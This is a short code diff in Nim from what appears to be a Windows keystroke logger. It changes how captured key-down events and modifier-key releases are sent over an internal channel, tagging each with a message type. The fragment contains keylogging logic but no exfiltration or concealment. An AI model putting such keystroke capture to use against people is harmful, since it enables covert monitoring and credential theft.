@@ -60,7 +60,7 @@ proc processDataThread(): void {.thread.} =
       let keyText: string = $key
 
       if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
-        mainChannel.send keyText
+        mainChannel.send ("k", keyText)
 
       elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
         if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or # ctrl
@@ -68,7 +68,7 @@ proc processDataThread(): void {.thread.} =
           key == VK_MENU or key == VK_LMENU or key == VK_RMENU or # alt
           key == VK_LWIN or key == VK_RWIN: # win
 
-          mainChannel.send "<" & keyText # insert like [SHIFT] [a] [b] <[SHIFT]
+          mainChannel.send ("k", "<" & keyText) # insert like [SHIFT] [a] [b] <[SHIFT]
 
     sleep(10)
 
